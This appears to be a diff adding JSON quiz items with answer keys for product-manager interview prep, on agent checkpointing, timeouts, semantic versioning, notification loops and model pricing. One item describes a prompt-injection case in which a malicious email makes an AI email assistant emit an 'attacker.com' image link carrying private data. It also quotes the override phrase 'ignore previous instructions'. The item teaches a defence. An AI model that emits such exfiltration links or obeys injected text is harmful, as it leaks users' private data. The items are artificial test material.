+   "question": "Your AI agent runs 40-step research tasks that take about 20 minutes. If any tool call fails near the end, the whole task restarts from scratch, wasting cost and frustrating users. What's the best product and engineering fix?",
+   "options": [
+    "Save progress after each step so the agent can retry the failed step and resume from there",
+    "Cap tasks at 10 steps so failures are less likely to happen at all",
+    "Switch to a larger model so the agent makes fewer mistakes overall",
+    "Run every task twice in parallel and keep whichever copy finishes first"
+   ],
+   "answer": 0,
+   "explanation": "Long tasks will hit transient failures. Checkpointing saves state after each step, so a failure only needs a retry of that step, not the whole run. That cuts wasted cost and time and makes long tasks reliable. Pair it with safe retries for tools that have side effects.",
+   "rationales": [
+    "Correct: it limits the cost of failure to one step and makes long tasks dependable.",
+    "Capping steps prevents users from doing the tasks they need, and failures can still happen within 10 steps.",
+    "A bigger model doesn't stop tool timeouts or API errors, which are the main causes here, and it costs more.",
+    "Running twice doubles cost and both copies can fail the same way. It treats the symptom expensively."
+   ],
+   "interview_tip": "Reliability questions about agents reward answers that design for failure. Mentioning checkpointing and safe retries shows you think about production, not demos."
+  },
+  {
+   "topic": "AI Product",
+   "concept": "Blocking data exfiltration through rendered links and images in LLM output",
+   "difficulty": "hard",
+   "question": "Your AI email assistant can read a user's inbox and shows its answers as rich text. A security review shows a malicious email can make the model output an image link like 'attacker.com/pixel?data=<private info>', which the app loads automatically. What's the most effective fix?",
+   "options": [
+    "Don't auto-load external images or links from model output; allow only trusted domains or require a click",
+    "Add a line to the system prompt telling the model never to include private information in links",
+    "Use a more capable model that is harder to trick with injected instructions",
+    "Scan incoming emails with a keyword filter for words like 'ignore previous instructions'"
+   ],
+   "answer": 0,
+   "explanation": "The leak happens when the app fetches the URL, sending data to the attacker without the user doing anything. Blocking auto-loading of untrusted images and links closes that channel no matter what the model outputs. Prompt rules and smarter models reduce the chance of injection but can't guarantee it, so you need a control outside the model.",
+   "rationales": [
+    "Correct: it removes the leak channel in code, so even a fooled model can't send data out.",
+    "Prompt instructions can be overridden by injected text. They help, but aren't a reliable security boundary.",
+    "Better models resist some attacks, but no model is fully immune to prompt injection.",
+    "Attackers can easily rephrase injections, so keyword filters miss most attacks."
+   ],
+   "interview_tip": "AI safety questions reward 'enforce it outside the model'. Explaining the specific leak path, and closing it in code, shows strong technical judgment."
+  },
+  {
+   "topic": "Technology",
+   "concept": "Deadline propagation and timeouts in chained service calls",
+   "difficulty": "medium",
+   "question": "Your checkout page calls an order service, which calls inventory, which calls a slow warehouse API. When the warehouse is slow, checkout requests hang for over a minute and pile up until the site slows down. What's the best fix?",
+   "options": [
+    "Set a total time budget for the request and pass it down, so each call times out and fails fast",
+    "Increase server capacity so more hanging requests can be held at the same time",
+    "Retry the warehouse call immediately and repeatedly until it succeeds",
+    "Remove the inventory check from checkout so the warehouse API is never called"
+   ],
+   "answer": 0,
+   "explanation": "Without timeouts, one slow dependency ties up resources up the whole chain, causing a pile-up. Giving the request an overall deadline and passing it to each downstream call makes them give up in time, freeing resources and letting the app show a fallback (like 'checking stock'). This keeps one slow API from taking down checkout.",
+   "rationales": [
+    "Correct: it stops slow calls from piling up and lets the system fail fast with a fallback.",
+    "More servers only delay the pile-up; hanging requests will fill them too.",
+    "Immediate retries add even more load to an already slow API, which makes the problem worse.",
+    "Skipping inventory risks selling items that are out of stock. It trades one problem for another."
+   ],
+   "interview_tip": "System-design questions often test failure handling. Mentioning timeouts, deadlines and fallbacks shows you understand how one slow service can cascade."
+  },
+  {
+   "topic": "Technology",
+   "concept": "Semantic versioning (major.minor.patch)",
+   "difficulty": "easy",
+   "question": "Your public SDK is on version 2.4.1. You're releasing a change that renames a method, so existing code calling the old name will break. Under semantic versioning, what should the new version be?",
+   "options": [
+    "3.0.0, because it is a breaking change",
+    "2.5.0, because it adds and renames functionality",
+    "2.4.2, because it is a small code change",
+    "2.4.1-new, keeping the same number with a label"
+   ],
+   "answer": 0,
+   "explanation": "Semantic versioning uses MAJOR.MINOR.PATCH. Breaking changes bump MAJOR, new backward-compatible features bump MINOR, and backward-compatible bug fixes bump PATCH. A rename that breaks existing callers is breaking, so it's 3.0.0. That signals developers to check their code before upgrading.",
+   "rationales": [
+    "Correct: any change that breaks existing callers requires a major version bump.",
+    "Minor versions are for backward-compatible additions. A rename breaks old code, so it isn't minor.",
+    "Patch versions are for backward-compatible fixes. Breaking changes hidden in a patch surprise developers.",
+    "Labels like this aren't part of the standard scheme for releases and don't signal the break."
+   ],
+   "interview_tip": "Platform PMs should know how versioning tells developers what's safe. Mentioning deprecation warnings before a major release shows care for developers."
+  },
+  {
+   "topic": "Growth",
+   "concept": "Network-triggered notifications as a retention loop",
+   "difficulty": "medium",
+   "question": "A photo-sharing app wants to improve week-4 retention. Generic reminders ('You haven't posted in a while!') have low open rates and drive opt-outs. Which notification strategy is most likely to lift retention?",
+   "options": [
+    "Notify users when people they know act on their content or invite them to something, e.g. a friend commenting",
+    "Send the generic reminder more often so more users see it before they churn",
+    "Send a daily digest of trending photos from accounts the user doesn't follow",
+    "Offer a small reward like a badge for opening the app five days in a row"
+   ],
+   "answer": 0,
+   "explanation": "Notifications driven by other people's actions (a comment, a tag, a reply) are relevant, timely, and personal, so they get opened and bring users back into a real interaction. Each action creates another notification for someone else, forming a loop. Generic nudges feel like spam and wear out the channel.",
+   "rationales": [
+    "Correct: social triggers are relevant and create a loop where engagement drives more engagement.",
+    "More of a low-value notification increases opt-outs and damages the channel for every future message.",
+    "Content from strangers is weaker than activity from friends and is easy to ignore.",
+    "Streak rewards can help some users, but they're less tied to real value than a friend interacting with you."
+   ],
+   "interview_tip": "Growth interviews like loops over one-off pushes. Explaining why social triggers work, and how you'd watch opt-out rates, shows balanced thinking."
+  },
+  {
+   "topic": "Current Events",
+   "concept": "Planning unit economics at post-introductory model prices (Gemini 4 Carbon, Oct 2026)",
+   "difficulty": "medium",
+   "source": "https://latenode.com/news/google-gates-gemini-4-carbon-with-token-prices-set-to-double",
+   "question": "In late October 2026, Google priced Gemini 4 Carbon at an introductory $2 per million input tokens and $10 per million output tokens, with rates set to rise to $4 and $20 after the introductory period. You're planning a new AI feature on this model. How should you model its costs?",
+   "options": [
+    "Build the business case at the post-introductory rates, treating the intro price as a temporary bonus",
+    "Use the introductory rates, since providers usually extend promotional pricing for popular models",
+    "Average the two rates, since the feature will run partly in each pricing period",
+    "Ignore token prices for now, since model costs always fall over time"
+   ],
+   "answer": 0,
+   "explanation": "Google announced that Gemini 4 Carbon's prices would double from $2/$10 to $4/$20 per million input/output tokens after an introductory period. A feature's margins and pricing should hold at the price you'll actually pay long term. Planning at the higher rate avoids a margin shock or forced price rise for customers when the intro period ends.",
+   "rationales": [
+    "Correct: it plans for the long-run cost, so unit economics don't break when the announced increase arrives.",
+    "The rise was announced. Betting on an extension adds risk to your margins with no basis.",
+    "Averaging understates long-run cost; after the intro period ends, every request costs the higher rate.",
+    "Prices may fall over time, but this one is scheduled to rise. Ignoring cost is how AI features end up unprofitable."
+   ],
+   "interview_tip": "AI PM interviews increasingly test cost awareness. Showing you'd plan on durable prices and model margins per task signals business judgment, not just model enthusiasm."
+  }
+ ]
+}
